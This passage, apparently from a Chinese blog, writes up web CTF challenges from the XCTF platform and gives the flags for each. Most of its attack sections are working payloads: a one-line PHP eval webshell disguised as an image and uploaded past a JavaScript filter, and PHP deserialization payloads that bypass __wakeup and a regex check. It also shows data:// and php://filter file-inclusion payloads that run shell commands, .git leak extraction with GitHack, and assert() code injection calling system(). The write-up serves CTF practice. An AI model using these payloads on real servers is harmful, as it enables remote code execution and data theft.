class="hljs-comment">//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</span><br></code></pre></td></tr></table></figure><p>最后访问即可得到flag：<code>cyberpeace{48a58397b3c434b2436426a5c3479d12}</code></p><h4 id="9-upload1"><a href="#9-upload1" class="headerlink" title="9_upload1"></a>9_upload1</h4><h5 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h5><p>文件上传题，检查网页源码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) {  </span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>;  </span><br><span class="language-javascript">    <span class="hljs-keyword">while</span> (i--) {  </span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>[i] === obj) {  </span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  </span><br><span class="language-javascript">        }</span><br><span class="language-javascript">    }</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  </span><br><span class="language-javascript">}</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>){</span><br><span class="language-javascript">upfile = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"upfile"</span>);</span><br><span class="language-javascript">submit = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"submit"</span>);</span><br><span class="language-javascript">name = upfile.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">ext = name.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.+\./</span>,<span class="hljs-string">''</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>([<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>].<span class="hljs-title function_">contains</span>(ext)){</span><br><span class="language-javascript">submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">}<span class="hljs-keyword">else</span>{</span><br><span class="language-javascript">submit.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">'请选择一张图片文件上传!'</span>);</span><br><span class="language-javascript">}</span><br><span class="language-javascript">}</span><br></code></pre></td></tr></table></figure><h5 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h5><ul><li>本题JS绕过：修改上传文件后缀</li></ul><h5 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h5><p>文件上传题，想办法上传webshell，很明显前端有一个JS过滤，有两种办法，一种是在网页元素里删除JS后上传，另一种是上传图片🐎，我这里选择上传图片🐎。</p><p>编写一个图片🐎b.jpg：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>bypass前端后通过BP抓包修改</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_2.jpg" class=""><p>回显：<code>upload success : upload/1667464623.b.php</code></p><p>通过蚁剑连接：<code>http://61.147.171.105:50598/upload/1667464623.b.php</code>   密码为：<code>cmd</code></p><p>找到flag</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_1.jpg" class=""><h4 id="10-文件包含-泰山杯"><a href="#10-文件包含-泰山杯" class="headerlink" title="10_文件包含 泰山杯"></a>10_文件包含 泰山杯</h4><h5 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h5><p>文件包含题，进入直接一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">"./check.php"</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h5><p>很明显，要提交一个filename参数进去。</p><p>首先，随便提交一个payload，<code>filename=flag.php</code></p><p>有回显：<code>you have use the right usage , but error method</code></p><p>然后尝试一下php伪协议，payload：<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p><p>有回显：<code>do not hack!</code>，说明是有过滤的。继续构造payload<code>filename=php://filter/read</code>，还是被过滤，说明是read被过滤掉了,同样的发现base64被过滤。</p><p>尝试后发现<code>convert.iconv.</code>未被过滤，那么可以使用BP对iconv中的两个字段爆破，使用提前编写好的字典。</p><p><strong>将<code>.iconv</code>的两个可选参数标为payload，并且选择<code>Cluster bomb</code>模式，设置好字典为准备好的.txt文件。爆破出来选择最长的response查看。</strong></p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_3.jpg" class=""><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_2.jpg" class=""><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_1.jpg" class=""><h4 id="11"><a href="#11" class="headerlink" title="11_"></a>11_</h4><h5 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h5><p>直接可以看到代码，检查网页源码也是一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>{<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">'111'</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);<br>}<br>?code=<br></code></pre></td></tr></table></figure><h5 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP反序列化编写格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//反序列化数组，a是数组的意思</span><br>a:<span class="hljs-number">3</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"4444"</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;}<br><span class="hljs-comment">//反序列化对象，O是对象的意思</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">"xctf"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"fall"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"111"</span>;}<br></code></pre></td></tr></table></figure></li><li><p><strong>__wakeup函数的bypass：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行</strong></p></li></ul><h5 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h5><p>很显然只是显示了部分代码，只有给出的code可以操作，那么传一个code参数上去</p><p><code>code=111</code>,回显<code>you should not type an integer</code>，告诉我们不传整型，且说明code变量是可用的。</p><p>这是一个反序列化的问题。</p><p>反序列化构造：<code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code>，这样行不通，会调用wakeup函数</p><p>利用PHP漏洞：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，</p><p>传入：<code>O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></p><p>回显：<code>the answer is : cyberpeace{475ed74daf373a5a3a3fe01821af26e4}</code></p><h4 id="12-Web-php-include-CTF"><a href="#12-Web-php-include-CTF" class="headerlink" title="12_Web_php_include_CTF"></a>12_Web_php_include_CTF</h4><h5 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'hello'</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">"php://"</span>)) {<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"php://"</span>, <span class="hljs-string">""</span>, <span class="hljs-variable">$page</span>);<br>}<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP函数——<strong>strstr</strong>：搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p></li><li><p>PHP函数——<strong>str_replace</strong>：以其他字符替换字符串中的一些字符</p></li><li><h5 id="PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On"><a href="#PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On" class="headerlink" title="==PHP伪协议：data://==:类似php://input，可以让用户来控制输入流，用户输入的data://流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen=On，allow_url_include=On"></a>==<strong>PHP伪协议：data://</strong>==:类似php://input，可以让用户来控制输入流，用户输入的data://流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen=On，allow_url_include=On</h5></li><li><p>var_dump用于显示字符串</p></li></ul><h5 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h5><p>题目的意思很明显，我们要传一个GET类型的page参数上去，然后其会替换page里面的php://为空，防止我们显示文件内容。那么我们使用data://就好了。</p><p>首先构造payload:<code>?page=data://text/plain,&lt;?php exec('ls',$result);var_dump($result);?&gt;</code></p><p>获得如下回显：</p><p><code>array(3) { [0]=&gt; string(18) "fl4gisisish3r3.php" [1]=&gt; string(9) "index.php" [2]=&gt; string(11) "phpinfo.php" }</code></p><p><code>data://text/plain,&lt;?php echo $page?&gt;</code></p><p>很显然，我们的flag应该在<code>fl4gisisish3r3.php</code>文件里，那么我们cat一下文件里的内容就行了。</p><p>再构造payload：<code>?page=data://text/plain,&lt;?php exec('cat fl4gisisish3r3.php',$result);var_dump($result);?&gt;</code></p><p>获得如下回显：<code>array(3) { [0]=&gt; string(5) " string(50) "$flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";" [2]=&gt; string(2) "?&gt;" }</code>，找到flag.</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/Web_php_include_CTF_1.jpg" class=""><p>ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p><h4 id="13-Web-php-unserialize（题解未写完）"><a href="#13-Web-php-unserialize（题解未写完）" class="headerlink" title="13_Web_php_unserialize（题解未写完）"></a>13_Web_php_unserialize（题解未写完）</h4><h5 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h5><p>进去一段PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>{ <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">'index.php'</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>{ <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{ <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>{ <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">'index.php'</span>) { <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">'index.php'</span>; <br>        } <br>    } <br>}<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])) { <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[oc]:\d+:/i'</span>, <span class="hljs-variable">$var</span>)) { <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'stop hacking!'</span>); <br>    } <span class="hljs-keyword">else</span> {<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    } <br>} <span class="hljs-keyword">else</span> { <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">"index.php"</span>); <br>} <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h5><ul><li>wakeup函数的绕过方法</li><li>O:+6绕过对O的正则匹配</li><li><strong>字符逃逸问题</strong></li></ul><h5 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h5><p>反序列化题，注意到<code>__destruct里有一个highlight_file</code>，这里就是出flag的地方。</p><p>显然，题目已经告诉我们secret在fl4g.php里，我们不妨先想办法去看看再说，</p><p>上传一个GET参数var，首先会被base64解码，然后会被正则过滤关键字，这里需要绕过，然后就被反序列化了，开始调用一个<code>wakeup</code>函数，会判断file参数是否是index，不是则置为index，这里也需要绕过，总共两个绕过点。</p><p>wakeup函数很好绕过，关键是正则匹配，<code>/[oc]:\d+:/</code>，这里的意思是匹配<code>o:数字:</code>，所以我们序列化中的<code>o:4</code>，就需要改一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">'fl4g.php'</span>);<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'O:4'</span>,<span class="hljs-string">'O:+4'</span>,<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'1:'</span>,<span class="hljs-string">'2:'</span>,<span class="hljs-variable">$s</span>);<br><span class="hljs-keyword">echo</span> base64-<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-comment">//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}</span><br><span class="hljs-comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></code></pre></td></tr></table></figure><p>payload就为<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><h4 id="14-MFW（git泄露）"><a href="#14-MFW（git泄露）" class="headerlink" title="14_MFW（git泄露）"></a>14_MFW（git泄露）</h4><h5 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h5><p>进去是一个个人网站的样子。跳转到About页面时，出现：</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_1.jpg" class=""><p>使用了Git，说明开发者使用Git进行版本控制，很可能会存在Git引起的文件泄露问题。</p><h5 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>Git引起的文件泄露</p></li><li><p>PHP函数：str_pos:</p></li><li><p><strong>PHP函数：assert:</strong></p><ul><li><p>书写格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//PHP5,7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> = ?): <span class="hljs-keyword">bool</span><br><span class="hljs-comment">//PHP7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> = ?): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure></li><li><p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert() 当做 PHP 代码来执行</strong>。如果传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的assert_options处理函数时，条件会转换为字符串，而布尔值 <strong><code>false</code></strong> 会被转换成空字符串</p></li></ul></li><li></li></ul><h5 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h5><p>可能是Git泄露，尝试在浏览器访问：<code>/.git/</code>，结果出现了回显，说明猜测正确。我们使用git hack获取服务器上用git管理的文件</p><p>首先在命令行中进入githack目录下，使用<code>python GitHack.py http://61.147.171.105:56499/.git/</code>，之后会在git hack目录下生成获取到的文件的文件夹。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_2.jpg" class="">  <p>获得的index.php代码如下：省略html部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>])) {<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>];<br>} <span class="hljs-keyword">else</span> {<br><span class="hljs-variable">$page</span> = <span class="hljs-string">"home"</span>;<br>}<br><span class="hljs-variable">$file</span> = <span class="hljs-string">"templates/"</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">".php"</span>;<br><span class="hljs-comment">// I heard '..' is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">"strpos('<span class="hljs-subst">$file</span>', '..') === false"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Detected hacking attempt!"</span>);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">"file_exists('<span class="hljs-subst">$file</span>')"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"That file doesn't exist!"</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现了<code>assert</code>函数，可以通过其来执行PHP代码，这里就是解题的关键。</p><p>构造payload：<code>fff')</code>用于闭合assert函数</p><p><code>fff') or exec("ls",$result);var_dump($result);//</code>          不行</p><p><code>fff') or include("data://text/plain,&lt;?php exec("ls",$result);var_dump($result);?&gt;");</code>      不行</p><p><code>fff') or system("cat templates/flag.php")//</code>      可行</p><h4 id="15-ics-05"><a href="#15-ics-05" class="headerlink" title="15_ics_05"></a>15_ics_05</h4><h5 id="描述-13"><a href="#描述-13" class="headerlink" title="描述"></a>描述</h5><p>是一个实际场景，只有设备维护中心的page能被点开</p><h5 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>文件包含</p></li><li><p><strong>ctype_alnum() 函数检测字符串是否全部为字母和(或)数字字符，如果文本中的每个字符都是字母或数字，则返回TRUE，否则返回FALSE。</strong></p></li><li><p><strong>==正则表达式的修饰符：==</strong></p><p><strong>i：</strong>ignore-不区分大小写<strong>g：</strong>global-全局匹配<strong>m：</strong>multi line-多行匹配</p></li><li><p>preg_replace函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br></code></pre></td></tr></table></figure><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li><li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: 可选，为替换执行的次数。</li><li>==<strong>/e参数：可以传入 /e 的修饰符，然后让代码执行</strong>==</li></ul></li></ul><h5 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h5><p>首先检查网页源码，只有html没有php，没用，所以我们第一个任务是找到php源码，首先访问一下index.phps，返回400，没用，看一下有没有git泄露，访问<code>/.git/</code>也没有，那就继续看看页面有没有什么可以交互的地方，发现点击标题的时候，页面发生了变化。url多了一个<code>/?page=index.php</code>，页面也出现了index，<strong>那么后端有一个page点可以交互，目前能想到的有两种，sql注入和文件包含漏洞</strong>，能排除sql注入，因为修改payload为<code>page=hhh</code>时，页面直接回显hhh，说明是没有走数据库的。那么就文件包含了，payload如下：</p><p>**<code>page=php://filter/read=convert.base64-enocode/resource=index.php</code>**，然后直接就扒出index.php经过base64-encode编码后的源码，很顺利，居然没有过滤需要绕过，然后我们解码就可以得到源码了。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/ics05_1.jpg" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">posix_setuid</span>(<span class="hljs-number">1000</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) {<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$page</span>)) {}<br>}<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$page</span>; <span class="hljs-keyword">die</span>();<span class="hljs-meta">?&gt;</span>&lt;/p&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">else</span>{}<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'input'</span>) &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'ta:text'</span>) &gt; 